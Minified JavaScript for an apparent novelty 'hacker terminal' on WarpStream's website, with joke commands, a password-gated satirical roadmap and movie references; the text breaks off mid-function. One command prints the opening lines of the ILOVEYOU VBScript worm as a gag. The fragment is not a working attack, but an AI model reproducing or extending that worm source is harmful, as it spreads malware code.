const consoleDiv=document.getElementById("console"),userInput=document.getElementById("userInput"),commandHistory=[];let historyIndex=-1,isPasswordMode=!1,userPrivilege="guest",passwordContext="";const availableCommands=["help","clear","directory","documentation","contact","exit","ls","cat","descend","history","date","demo","disclaimer","falken","sudo","su","cd","pwd","gibson"],availableFiles=["readme.md","warpstream.config","snowleopard.txt","wallpaper.png","loveletter.vbs.txt"],directoryStructure={data:["users.db","logs/","backups/"]},responses={help:`Available commands:
<div class="command-list">
<div><span class="command-name">HELP</span> Show this help message</div>
<div><span class="command-name">CLEAR</span> Clear the console</div>
<div><span class="command-name">DIRECTORY</span> Show available pages</div>
<div><span class="command-name">DOCUMENTATION</span> Open documentation</div>
<div><span class="command-name">CONTACT</span> Contact information</div>
<div><span class="command-name">LS</span> List directory contents</div>
<div><span class="command-name">CAT [file]</span> Display file contents</div>
<div><span class="command-name" style="color: red;">DESCEND</span> <span class="warning-text">ワープストリーム ⚠ ⚠ ⚠</span></div>
<div><span class="command-name">HISTORY</span> Show command history</div>
<div><span class="command-name">DATE</span> Display current date/time</div>
<div><span class="command-name">DEMO</span> Run WarpStream demo</div>
<div><span class="command-name">DISCLAIMER</span> Legal disclaimer</div>
<div><span class="command-name">FALKEN</span> Shall we play a game?</div>
<div><span class="command-name">EXIT</span> Exit the console</div>
</div>`,directory:"table",documentation:"Opening documentation...",contact:"Opening contact page...",exit:"Terminating session and returning to WarpStream homepage...",clear:"clear",ls:`<div class="command-list">
<div><span class="command-name">README.md</span> Documentation file</div>
<div><span class="command-name">warpstream.config</span> Configuration file</div>
<div><span class="command-name">snowleopard.txt</span> Restricted access file</div>
<div><span class="command-name">wallpaper.png</span> Wallpaper image</div>
<div><span class="command-name" style="color: #ff0000;">loveletter.vbs.txt</span> <span style="color: #888888; font-size: 0.9em;">Modified: 04-May-2000</span></div>
</div>`,"cat readme.md":`<div class="file-content"><div class="file-header"># WarpStream Terminal</div>
Welcome to the WarpStream interactive terminal.
This interface provides access to WarpStream's resources and documentation.

<div class="file-section">## Usage</div>
- Type 'help' to see available commands
- Use arrow keys to navigate command history
- Click on links in the directory to visit pages

<div class="file-section">## About WarpStream</div>
WarpStream is an Apache Kafka\xae compatible data streaming platform built directly on top of object storage: no inter-AZ networking costs, no disks to manage, and infinitely scalable, all within your VPC.

\xa9 WarpStream
</div>`,"cat snowleopard.txt":function(){return"root"===userPrivilege?`<div class="file-content"><div class="file-header">CLASSIFIED: Project Snow Leopard</div>
<div class="file-section">## TOP SECRET - AUTHORIZED PERSONNEL ONLY</div>
[INTERNAL REF: WS-ROADMAP-2024-Q3]
[CLASSIFICATION: LEVEL 3 - DISTRIBUTION RESTRICTED]

If you're viewing this document, your security clearance has been verified. As the integration between WarpStream and Confluent progresses, this document outlines our strategic Product Development Roadmap. This roadmap represents core advantage matrix over competing solutions.

<div class="file-section">## FEATURE IMPLEMENTATION ALPHA: Kafka Transaction Protocol</div>
[PRIORITY: CRITICAL] [TIMELINE: IMMINENT]
Status: Final testing phase

Implementation of full Kafka transaction protocol compatibility is nearing completion. This feature has been delayed due to extensive security and consistency testing necessary for mission-critical implementations. All fault-tolerance scenarios have been verified, with final battle-hardening tests in progress. Full compatibility with existing Kafka transaction semantics will be maintained.

<div class="file-section">## FEATURE IMPLEMENTATION BETA: Multi-tenant Resource Governance</div>
[PRIORITY: HIGH] [TIMELINE: NEAR-TERM]
Status: Development complete, integration testing

Our cluster-level quota management system addresses the fundamental weakness in Apache Kafka's broker-level quota implementation. The new governance layer operates at the cluster level, providing granular control over tenant resource allocation, preventing noisy-neighbor effects, and ensuring operational stability even under aberrant client behavior. Implementation includes throttling mechanisms that are configurable via our administrative console.

<div class="file-section">## FEATURE IMPLEMENTATION GAMMA: Customer-Controlled Schema Registry</div>
[PRIORITY: HIGH] [TIMELINE: NEAR-TERM]
Status: Architecture approved

The BYOC Schema Registry extends our data/control plane separation architecture to schema management. All schema data remains within customer-controlled storage environments, with metadata handling performed by WarpStream's control plane. This ensures complete data sovereignty while retaining the performance benefits of our distributed architecture. Implementation includes versioning controls and full compatibility with existing schema clients.

<div class="file-section">## PROJECT ORBIT: Cross-Platform Data Mirroring</div>
[PRIORITY: STRATEGIC] [TIMELINE: MEDIUM-TERM]
Status: Initial development

Project Orbit enables seamless mirroring from any Kafka-compatible source (OSS Kafka, Confluent, MSK) with offset preservation. Unlike MirrorMaker, Orbit maintains offset consistency and enables incremental adoption patterns. Implementation creates a unified data plane across disparate Kafka implementations, providing disaster recovery, local caching, tiered storage, and fanout capabilities without modifying existing clients.

<div class="file-section">## INFRASTRUCTURE EXPANSION: GCP/AZURE Control Plane</div>
[PRIORITY: MEDIUM] [TIMELINE: MEDIUM-TERM]
Status: Architecture planning

While WarpStream Agents operate in any environment with S3-compatible storage, our control plane is currently AWS-exclusive. This initiative extends control plane operations to GCP and Azure, eliminating cross-cloud network traffic for customers operating in those environments. Implementation will maintain feature parity across all supported cloud environments.

<div class="file-section">## PROJECT RESILIENCE: Multi-Region Active-Active Clusters</div>
[PRIORITY: STRATEGIC] [TIMELINE: LONG-TERM]
Status: Research phase

This advanced architecture enables WarpStream clusters to maintain active read/write capabilities across multiple regions with automatic failover. The implementation will support cross-region and cross-cloud operations with configurable consistency models. Fault tolerance extends to complete region failure without service interruption, maintaining transactional guarantees even during failover scenarios.

<div class="file-section">## ADDITIONAL CAPABILITIES ROADMAP</div>
[PRIORITY: VARIED] [TIMELINE: STAGGERED]

- Server-side partitioning: Dynamic partition management
- Partition auto-scaling: Automatic scaling based on load patterns
- Iceberg integration: Native integration similar to Confluent Tableflow
- Additional features in planning pipeline

NOTICE: Formal announcement of selected roadmap items scheduled for Current 2024 conference.

<div class="file-section">## SECURITY CLASSIFICATION</div>
CONFIDENTIAL - Internal distribution only. Unauthorized sharing prohibited.
</div>`:'<div class="warning-text">Access denied. This file requires higher privileges.</div>'},"cat warpstream.config":`<div class="file-content"><div class="file-header"># WarpStream Configuration</div>
<div class="file-section">## System Settings</div>
host: warpstream.com
mode: production

<div class="file-section">## Features</div>
- kafka_compatible
- cloud_native
- high_performance
- cost_efficient
</div>`,sudo:'<div class="warning-text">Password authentication required for sudo access.</div>',"sudo su":'<div class="warning-text">Password authentication required for privileged access.</div>',descend:"matrix",date:function(){return new Date().toString()},history:function(){return commandHistory.join("\n")},"cd data":"Changing directory to /data","cd ..":"Changing directory to /",cd:"Current directory: /",pwd:"/data","ls data":`<div class="command-list">
<div><span class="command-name">users.db</span> User database</div>
<div><span class="command-name">logs/</span> System logs directory</div>
<div><span class="command-name">backups/</span> Backup files</div>
</div>`,"cat data/users.db":'<div class="error">Error: Cannot display binary file content.</div>',falken:"Shall we play a game?",demo:"Starting WarpStream demo...",gibson:"Dialing in...",disclaimer:`<div style="color: #ffffff; border: 1px solid #00ff00; padding: 10px; background-color: rgba(0, 50, 0, 0.3);">
<span style="color: #00ffff; font-weight: bold;">LEGAL DISCLAIMER</span>

This terminal interface is a creative work of fiction and satire. 
</div>`,"cat wallpaper.png":function(){return window.open("https://cdn.prod.website-files.com/648b6360221506ec267256ae/67c5eec4a8cd41b8af4723cc_warpstream.png","_blank"),'<div class="success">Opening wallpaper.png...</div>'},"cat loveletter.vbs.txt":function(){return setTimeout(()=>{startLoveVirusEffect()},500),`<div class="warning-text">WARNING: This file appears to be malicious!</div>
<div class="file-content" style="color: #ff0000; font-family: monospace;">
rem barok -loveletter(vbe) <3
rem by: spyder / dangers crew / manila, philippines
on error resume next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0

set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullName,1)
vbscopy=file.ReadAll
main()

sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows Scripting Host\\Settings\\Timeout")
...
</div>`}},helpText=responses.help,updatedHelpText=helpText.replace('<div><span class="command-name">FORTUNE</span> Display a philosophical quote</div>\n',"");async function processInput(e){let t=e.toLowerCase();if(isPasswordMode){appendToConsole(`Password: ${"*".repeat(e.length)}`),"roadmap"===e?(isPasswordMode=!1,userInput.type="text",userInput.placeholder="",userPrivilege="root",updatePrompt(),appendToConsole('<div class="success">Authorization successful. Welcome, root user.</div>'),"snowleopard"===passwordContext&&appendToConsole(responses["cat snowleopard.txt"]())):(isPasswordMode=!1,userInput.type="text",userInput.placeholder="",appendToConsole('<div class="error">Access denied. Incorrect password.</div>')),passwordContext="";return}if(appendToConsole(`${getPrompt()} ${e}`),"clear"===t){clearConsole();return}if("descend"===t){startMatrixEffect();return}if("sudo"===t||"sudo su"===t||"su"===t){"root"===userPrivilege?appendToConsole("<div>You are already operating with root privileges.</div>"):(isPasswordMode=!0,passwordContext="sudo",userInput.type="password",userInput.placeholder="Enter password",appendToConsole("<div>Password required for 'sudo':</div>"));return}if("falken"===t){startFalkenSequence();return}if("demo"===t){runWarpStreamDemo();return}if(t.startsWith("cat ")){let n=t.substring(4).trim();if("snowleopard.txt"===n.toLowerCase()&&"root"!==userPrivilege){passwordContext="snowleopard",isPasswordMode=!0,userInput.type="password",userInput.placeholder="Enter password",appendToConsole('<div class="warning-text">RESTRICTED FILE: Authorization required</div>'),appendToConsole("<div>> What am I?</div>");return}let o=`cat ${n}`;responses[o]?"function"==typeof responses[o]?appendToConsole(responses[o]()):appendToConsole(responses[o]):appendToConsole(`File not found: ${n}`,"error");return}let a=handleNavigation();if(a[t]){let i=appendToConsole(`Loading ${t}...`,"loading");await simulateLoading(),i.remove(),appendToConsole(`Opening ${t} in new tab...`),window.open(a[t],"_blank");return}if(responses[t]?"directory"===t?appendDirectoryTable():appendToConsole(responses[t]):appendToConsole(`Command not found: ${e}`,"error"),"exit"===t){userInput.disabled=!0,setTimeout(()=>{let e=document.createElement("div");e.style.position="fixed",e.style.top="0",e.style.left="0",e.style.width="100%",e.style.height="100%",e.style.backgroundColor="#000",e.style.zIndex="9999",e.style.opacity="0",e.style.transition="opacity 1.5s ease-in-out",document.body.appendChild(e);let t=document.createElement("div");t.textContent="Returning to WarpStream.com...",t.style.position="fixed",t.style.top="50%",t.style.left="50%",t.style.transform="translate(-50%, -50%)",t.style.color="#00ff00",t.style.fontSize="24px",t.style.fontWeight="bold",t.style.textAlign="center",t.style.fontFamily="'Plus Jakarta Sans', sans-serif",t.style.opacity="0",t.style.transition="opacity 1s ease-in-out",t.style.zIndex="10000",document.body.appendChild(t),setTimeout(()=>{e.style.opacity="1",setTimeout(()=>{t.style.opacity="1",setTimeout(()=>{window.location.href="https://www.warpstream.com/"},2e3)},500)},100)},1e3);return}if("gibson"===t){hackTheGibson();return}}function handleNavigation(){return{home:"https://www.warpstream.com/",pricing:"https://www.warpstream.com/pricing",mdp:"https://www.warpstream.com/managed-data-pipelines-kafka-compatible-stream-processing",byoc:"https://www.warpstream.com/bring-your-own-cloud-kafka-data-streaming",company:"https://www.warpstream.com/about",contact:"https://www.warpstream.com/contact-us",blog:"https://www.warpstream.com/blog",documentation:"https://docs.warpstream.com/warpstream","executive summary":"https://www.warpstream.com/executive-summary",orbit:"https://www.warpstream.com/orbit-apache-kafka-migration-and-replication","data governance":"https://www.warpstream.com/data-governance-schema-registry-and-validation"}}function appendToConsole(e,t="",n=!1){let o=document.createElement("div");return e.includes("<div")?o.innerHTML=e:o.textContent=e,t&&o.classList.add(t),consoleDiv.insertBefore(o,document.getElementById("inputLine")),consoleDiv.scrollTop=consoleDiv.scrollHeight,o}function clearConsole(){for(;consoleDiv.firstChild&&"inputLine"!==consoleDiv.firstChild.id;)consoleDiv.removeChild(consoleDiv.firstChild)}function appendDirectoryTable(){let e=document.createElement("div");e.className="site-directory",e.innerHTML=`
    <div><span class="site-link" onclick="processInput('home')">Home</span> WarpStream main page</div>
    <div><span class="site-link" onclick="processInput('pricing')">Pricing</span> Product pricing information</div>
    <div><span class="site-link" onclick="processInput('byoc')">BYOC</span> Bring Your Own Cloud solution</div>
    <div><span class="site-link" onclick="processInput('mdp')">MDP</span> Managed data pipeline services</div>
    <div><span class="site-link" onclick="processInput('orbit')">Orbit</span> Kafka migration and replication</div>
    <div><span class="site-link" onclick="processInput('data governance')">Data Governance</span> Schema registry and validation</div>
    <div><span class="site-link" onclick="processInput('executive summary')">Executive Summary</span> Overview for decision makers</div>
    <div><span class="site-link" onclick="processInput('contact')">Contact</span> Get in touch with our team</div>
    <div><span class="site-link" onclick="processInput('blog')">Blog</span> Latest articles and updates</div>
  `,consoleDiv.insertBefore(e,document.getElementById("inputLine")),consoleDiv.scrollTop=consoleDiv.scrollHeight}async function simulateLoading(){return new Promise(e=>setTimeout(e,1500))}async function typeText(e,t,n=50){for(let o of e)t.textContent+=o,await new Promise(e=>setTimeout(e,n))}function initializeCursor(){}async function simulateConnection(){document.getElementById("inputLine").style.display="none";let e=document.querySelectorAll(".hidden:not(.ascii-art):not(#inputLine)");e.forEach(e=>{e.style.display="none"});let t=document.querySelector(".connection-sequence");for(let n of(await typeText("Connecting to WarpStream terminal...",t),await new Promise(e=>setTimeout(e,800)),["Establishing secure connection...","Verifying credentials...","Connection established. Welcome to WarpStream."]))await typeText("\n"+n,t,30),await new Promise(e=>setTimeout(e,400));await new Promise(e=>setTimeout(e,800)),t.innerHTML="";let o=document.querySelector(".ascii-art"),a=o.innerHTML;o.innerHTML="",o.classList.remove("hidden"),o.style.display="block";let i=a.trim().split("\n");for(let s of i){let r=document.createElement("div");r.textContent=s,o.appendChild(r),await new Promise(e=>setTimeout(e,100))}await new Promise(e=>setTimeout(e,800));for(let l=0;l<e.length;l++){let d=e[l];d.classList.remove("hidden"),d.style.display="block",await new Promise(e=>setTimeout(e,300))}let p=document.getElementById("inputLine");p.classList.remove("hidden"),p.style.display="flex";let c=document.getElementById("inputPrompt");c.textContent=getPrompt(),userInput.focus()}function startGlitchEffect(){let e=document.createElement("div");e.style.position="fixed",e.style.top="0",e.style.left="0",e.style.width="100%",e.style.height="100%",e.style.overflow="hidden",e.style.zIndex="1002",e.style.fontFamily="monospace",e.style.color="#00ff00",document.body.appendChild(e),document.body.style.overflow="hidden",consoleDiv.style.overflowY="hidden";let t=document.querySelectorAll('div[style*="zIndex: 1001"]');t.forEach(e=>{e.parentNode&&e.parentNode.removeChild(e)}),document.body.style.animation="";let n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,./<>?`~アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";for(let o=0;o<50;o++)createGlitchText(e,n);let a=1,i=setInterval(()=>{a=Math.min(a+1,20);for(let t=0;t<2*a;t++)createGlitchText(e,n);if(Math.random()>.7&&(e.style.backgroundColor=`rgba(${255*Math.random()}, ${255*Math.random()}, ${255*Math.random()}, 0.1)`,setTimeout(()=>{e.style.backgroundColor="transparent"},50)),Math.random()>.5){let o=(Math.random()-.5)*a*2,i=(Math.random()-.5)*a*2;document.body.style.transform=`translate(${o}px, ${i}px)`,setTimeout(()=>{document.body.style.transform="translate(0, 0)"},50)}for(;e.children.length>200;)e.removeChild(e.firstChild)},100);setTimeout(()=>{clearInterval(i),document.body.removeChild(e),document.body.style.transform="translate(0, 0)",clearInterval(window.matrixInterval);let t=document.querySelector("canvas");t&&t.parentNode&&t.parentNode.removeChild(t);let n=document.createElement("div");n.textContent="",n.style.position="fixed",n.style.top="50%",n.style.left="50%",n.style.transform="translate(-50%, -50%)",n.style.color="#00ff00",n.style.fontSize="24px",n.style.fontWeight="bold",n.style.textAlign="center",n.style.fontFamily="'Plus Jakarta Sans', sans-serif",n.style.zIndex="1003",n.style.textShadow="0 0 10px #00ff00",document.body.appendChild(n);let o="System recovered from a hyperdimensional anomaly.",a=0;!function e(){a<o.length&&(n.textContent+=o.charAt(a),a++,setTimeout(e,50))}(),setTimeout(()=>{n.style.opacity="0",n.style.transition="opacity 1s ease-in-out",setTimeout(()=>{window.location.reload()},1e3)},50*o.length+2e3)},5e3)}function createGlitchText(e,t){let n=document.createElement("div");n.style.position="absolute",n.style.left=`${100*Math.random()}%`,n.style.top=`${100*Math.random()}%`,n.style.fontSize=`${24*Math.random()+8}px`,n.style.opacity=.8*Math.random()+.2,n.style.color=`rgb(${Math.floor(100*Math.random())}, ${Math.floor(155*Math.random()+100)}, ${Math.floor(100*Math.random())})`;let o=Math.floor(20*Math.random())+3,a="";for(let i=0;i<o;i++)a+=t.charAt(Math.floor(Math.random()*t.length));n.textContent=a,e.appendChild(n),setTimeout(()=>{e.contains(n)&&e.removeChild(n)},1e3*Math.random()+500)}function startMatrixEffect(){window.savedContent=consoleDiv.innerHTML,window.originalBodyOverflow=document.body.style.overflow,window.originalConsoleOverflow=consoleDiv.style.overflowY,document.body.style.overflow="hidden",consoleDiv.style.overflowY="hidden",consoleDiv.innerHTML="",consoleDiv.style.fontFamily="monospace";let e=document.createElement("canvas");e.width=window.innerWidth,e.height=window.innerHeight,e.style.position="fixed",e.style.top="0",e.style.left="0",e.style.zIndex="1000",document.body.appendChild(e);let t=document.createElement("div");t.textContent="You've entered The Stream.",t.style.position="fixed",t.style.top="50%",t.style.left="50%",t.style.transform="translate(-50%, -50%)",t.style.color="#00ff00",t.style.fontSize="32px",t.style.fontWeight="bold",t.style.textShadow="0 0 10px #00ff00",t.style.zIndex="1001",t.style.textAlign="center",t.style.fontFamily="'Plus Jakarta Sans', sans-serif",t.style.transition="opacity 1s ease-in-out",t.style.opacity="0",document.body.appendChild(t);let n=document.createElement("div");n.style.position="fixed",n.style.bottom="20%",n.style.left="50%",n.style.transform="translate(-50%, 0)",n.style.color="#ff0000",n.style.fontSize="18px",n.style.fontWeight="normal",n.style.textShadow="0 0 8px #ff0000",n.style.zIndex="1001",n.style.textAlign="center",n.style.fontFamily="'Courier New', monospace",n.style.opacity="0",n.style.transition="opacity 0.5s ease-in-out",n.style.maxWidth="80%",document.body.appendChild(n),setTimeout(()=>{t.style.opacity="1"},500);let o=["System anomaly detected...","Unknown data patterns emerging...","WARNING: Unauthorized neural interface detected","Reality parameters destabilizing...","C̷a̷n̷ ̷y̷o̷u̷ ̷h̷e̷a̷r̷ ̷t̷h̷e̷m̷?̷","T̸h̸e̸y̸'̸r̸e ̸w̸a̸t̸c̸h̸i̸n̸g̸ ̸y̸o̸u̸ ̸n̸o̸w̸","Y̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ǫ̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ų̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰C̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ą̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰N̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰N̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ǫ̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰T̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰ ̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ę̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰S̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰C̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ą̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰P̷̨̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰Ę̷̛̠̱̖̘̙̣̱̮̫̮̙̘̘̭̖̱̱̰"],a=0,i=2e3;function s(){if(a<o.length){n.textContent=o[a],n.style.opacity="1",n.style.fontSize=`${18+2*a}px`,n.style.fontWeight=a>3?"900":"600";let e=Math.min(255,200+10*a);n.style.color=`rgb(${e}, ${Math.max(0,50-10*a)}, ${Math.max(0,50-10*a)})`;let r=8+2*a;if(n.style.textShadow=`0 0 ${r}px #ff0000`,a>3&&(document.body.style.animation="shake 0.5s infinite",!document.querySelector("#shake-keyframes"))){let l=document.createElement("style");l.id="shake-keyframes",l.textContent=`
            @keyframes shake {
              0% { transform: translate(1px, 1px) rotate(0deg); }
              10% { transform: translate(-1px, -2px) rotate(-1deg); }
              20% { transform: translate(-3px, 0px) rotate(1deg); }
              30% { transform: translate(3px, 2px) rotate(0deg); }
              40% { transform: translate(1px, -1px) rotate(1deg); }
              50% { transform: translate(-1px, 2px) rotate(-1deg); }
              60% { transform: translate(-3px, 1px) rotate(0deg); }
              70% { transform: translate(3px, 1px) rotate(-1deg); }
              80% { transform: translate(-1px, -1px) rotate(1deg); }
              90% { transform: translate(1px, 2px) rotate(0deg); }
              100% { transform: translate(1px, -2px) rotate(-1deg); }
            }
          `,document.head.appendChild(l)}setTimeout(()=>{n.style.opacity="0",a++,i=Math.max(500,i-300),a<o.length?setTimeout(s,i):(t.style.opacity="0",setTimeout(()=>{startGlitchEffect()},1e3))},1500)}}setTimeout(s,3e3);let r=e.getContext("2d"),l="アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789",d=Math.floor(e.width/20),p=[];for(let c=0;c<d;c++)p[c]=-100*Math.random();window.matrixInterval=setInterval(function t(){r.fillStyle="rgba(0, 0, 0, 0.05)",r.fillRect(0,0,e.width,e.height),r.fillStyle="#0F0",r.font="15px monospace";for(let n=0;n<p.length;n++){let o=l[Math.floor(Math.random()*l.length)];r.fillText(o,20*n,20*p[n]),20*p[n]>e.height&&Math.random()>.975&&(p[n]=0),p[n]++}},33)}async function runWarpStreamDemo(){let e=document.getElementById("inputLine");e.style.display="none",appendToConsole("Starting WarpStream demo..."),await new Promise(e=>setTimeout(e,800)),appendToConsole("Downloading darwin_arm64 ...");let t=document.createElement("div");t.style.fontFamily="monospace",t.style.whiteSpace="pre",t.style.color="#00ffff",consoleDiv.insertBefore(t,document.getElementById("inputLine"));for(let n=0;n<=100;n++){let o="▓".repeat(Math.floor(40*n/100)),a="░".repeat(40-o.length);t.textContent=`[${o}${a}] ${n}%`,await new Promise(e=>setTimeout(e,30))}t.textContent=`[${"▓".repeat(40)}] 100%`,await new Promise(e=>setTimeout(e,500)),appendToConsole("WarpStream Agent / CLI installed!"),await new Promise(e=>setTimeout(e,800)),appendToConsole("Try our demo by running: warpstream demo"),await new Promise(e=>setTimeout(e,1200)),appendToConsole("> warpstream demo"),await new Promise(e=>setTimeout(e,800)),appendToConsole("Signing up for temporary account..."),await new Promise(e=>setTimeout(e,1e3)),appendToConsole("Starting local agent..."),await new Promise(e=>setTimeout(e,1200)),appendToConsole("opening developer console in browser..."),await new Promise(e=>setTimeout(e,1e3)),appendToConsole('<div>consumer::demo-stream::shardId-000000000000 record: {"clue": "<span style="color: #00ffff">I am a traveler\'s guide to tomorrow</span>"}</div>'),await new Promise(e=>setTimeout(e,600)),appendToConsole('<div>consumer::demo-stream::shardId-000000000001 record: {"clue": "<span style="color: #00ffff">I chart the journey, not just the destination</span>"}</div>'),await new Promise(e=>setTimeout(e,600)),appendToConsole('<div>consumer::demo-stream::shardId-000000000002 record: {"clue": "<span style="color: #00ffff">With me, you can see beyond the horizon</span>"}</div>'),await new Promise(e=>setTimeout(e,600)),appendToConsole('<div>consumer::demo-stream::shardId-000000000003 record: {"clue": "<span style="color: #00ffff">I am the blueprint of possibilities</span>"}</div>'),await new Promise(e=>setTimeout(e,600)),appendToConsole('<div>consumer::demo-stream::shardId-000000000004 record: {"clue": "<span style="color: #ffff00">What am I?</span>"}</div>'),await new Promise(e=>setTimeout(e,600)),appendToConsole("Demo complete! Visit https://docs.warpstream.com to learn more.","success"),window.open("https://console.warpstream.com/signup","_blank"),e.style.display="flex",userInput.focus()}async function hackTheGibson(){let e=document.getElementById("inputLine");e.style.display="none",appendToConsole("ATTENTION: Attempting to access the Gibson supercomputer at Ellingson Mineral Company..."),await new Promise(e=>setTimeout(e,1500)),appendToConsole("INITIATING CONNECTION..."),await new Promise(e=>setTimeout(e,800)),appendToConsole("BYPASSING SECURITY..."),await new Promise(e=>setTimeout(e,1e3)),appendToConsole("INITIATING PORT SCAN ON TARGET SYSTEM..."),await new Promise(e=>setTimeout(e,1200)),appendToConsole(`
<div style="color: #00ffff; white-space: pre; line-height: 1.5;">
PORT SCAN COMPLETE:
+---------+--------+-------------+
| PORT    | STATE  | SERVICE     |
+---------+--------+-------------+
| 22/tcp  | open   | ssh         |
| 23/tcp  | open   | telnet      |
| 80/tcp  | open   | http        |
| 443/tcp | open   | https       |
| 1274/tcp| open   | GARBAGE.DAT |
+---------+--------+-------------+
</div>
  `),await new Promise(e=>setTimeout(e,1200)),appendToConsole("ATTEMPTING TO ACCESS GARBAGE FILE..."),await new Promise(e=>setTimeout(e,1e3)),appendToConsole(`
<div style="font-family: monospace; color: #ff0000;">
FILE FOUND: GARBAGE.DAT
SIZE: 12.8 GB
</div>
  `),await new Promise(e=>setTimeout(e,1e3)),appendToConsole("DOWNLOADING GARBAGE FILE...");let t=document.createElement("div");t.style.fontFamily="monospace",t.style.whiteSpace="pre",t.style.color="#00ffff",consoleDiv.insertBefore(t,document.getElementById("inputLine"));for(let n=0;n<=100;n++){let o="▓".repeat(Math.floor(40*n/100)),a="░".repeat(40-o.length);t.textContent=`[${o}${a}] ${n}%`,await new Promise(e=>setTimeout(e,30))}await new Promise(e=>setTimeout(e,500)),appendToConsole(`
<div style="font-family: monospace; color: #ff0000; font-weight: bold;">
!!! INTRUSION DETECTED !!!
TRACING CONNECTION...
</div>
  `),await new Promise(e=>setTimeout(e,1e3));try{let i=await fetch("https://ipapi.co/json/"),s=await i.json();appendToConsole(`
<div style="font-family: monospace; color: #ff0000;">
HACKER IDENTITY: UNKNOWN
IP ADDRESS: ${s.ip}
LOCATION: ${s.city}, ${s.region}, ${s.country_name}
</div>
    `)}catch(r){appendToConsole(`
<div style="font-family: monospace; color: #ff0000;">
HACKER IDENTITY: UNKNOWN
LOCATION: DETECTED
</div>
    `)}await new Promise(e=>setTimeout(e,1200)),appendToConsole(`
<div style="font-family: monospace; color: #ffff00;">
EMERGENCY DISCONNECT INITIATED...
</div>
  `),await new Promise(e=>setTimeout(e,1500)),appendToConsole(`
<div style="font-family: monospace; color: #00ff00;">
CONNECTION TERMINATED
</div>
  `),setTimeout(()=>{window.open("https://www.youtube.com/watch?v=IESEcsjDcmM","_blank")},1e3),await new Promise(e=>setTimeout(e,2e3)),e.style.display="flex",userInput.focus()}function startFalkenSequence(){let e=document.getElementById("inputLine");e.style.display="none",clearConsole();let t=document.createElement("div");async function n(e,n=70){let o=document.createElement("div");for(let a of(o.style.marginBottom="20px",t.appendChild(o),e))o.textContent+=a,await new Promise(e=>setTimeout(e,n));return new Promise(e=>setTimeout(e,1e3))}async function o(){await n("GREETINGS PROFESSOR FALKEN."),await n("THE ONLY WINNING MOVE IS NOT TO PLAY."),setTimeout(()=>{window.open("https://www.youtube.com/watch?v=KXzNo0vR_dU","_blank"),setTimeout(()=>{clearConsole(),t.parentNode&&t.parentNode.removeChild(t),e.style.display="flex",userInput.focus()},1500)},2e3)}t.style.color="#33ff33",t.style.fontFamily="monospace",t.style.marginTop="0px",consoleDiv.appendChild(t),o()}function getPrompt(){return`${userPrivilege}@warpstream:~#`}function updatePrompt(){document.getElementById("inputPrompt").textContent=getPrompt()}function autocompleteCommand(){let e=userInput.value.trim().toLowerCase();if(0===e.length)return;if(e.startsWith("cat ")){let t=e.substring(4).trim();if(t.includes("/")){let n=t.split("/"),o=n[0],a=n.length>1?n[1]:"";if(directoryStructure[o]){let i=directoryStructure[o].filter(e=>e.startsWith(a));1===i.length?userInput.value=`cat ${o}/${i[0]}`:i.length>1&&(appendToConsole(`
Possible completions:`),i.forEach(e=>{appendToConsole(`  ${o}/${e}`)}),appendToConsole(`${getPrompt()}`))}return}let s=availableFiles.filter(e=>e.startsWith(t));1===s.length?userInput.value=`cat ${s[0]}`:s.length>1&&(appendToConsole(`
Possible files:`),s.forEach(e=>{appendToConsole(`  ${e}`)}),appendToConsole(`${getPrompt()}`));return}let r=availableCommands.filter(t=>t.startsWith(e));1===r.length?userInput.value=r[0]:r.length>1&&(appendToConsole(`
Possible commands:`),r.forEach(e=>{appendToConsole(`  ${e}`)}),appendToConsole(`${getPrompt()}`),userInput.value=e)}function startLoveVirusEffect(){let e=document.createElement("div");e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.width="400px",e.style.backgroundColor="#c0c0c0",e.style.border="3px solid #0000aa",e.style.borderRadius="0px",e.style.padding="2px",e.style.boxShadow="5px 5px 10px rgba(0, 0, 0, 0.5)",e.style.zIndex="9999",e.style.fontFamily="Tahoma, Arial, sans-serif",e.style.color="#000000";let t=document.createElement("div");t.style.backgroundColor="#0000aa",t.style.color="white",t.style.padding="4px 8px",t.style.fontWeight="bold",t.style.display="flex",t.style.justifyContent="space-between",t.style.alignItems="center",t.style.cursor="move",t.innerHTML='<span>Windows System Security</span><span style="cursor: pointer;">\xd7</span>';let n=document.createElement("div");n.style.padding="15px",n.style.backgroundColor="#efefef",n.style.borderLeft="1px solid #dfdfdf",n.style.borderTop="1px solid #dfdfdf",n.style.borderRight="1px solid #888",n.style.borderBottom="1px solid #888",n.style.margin="2px",n.innerHTML=`
    <div style="display: flex; align-items: center; margin-bottom: 20px;">
      <div style="margin-right: 15px; color: red; font-size: 32px;">⚠</div>
      <div>
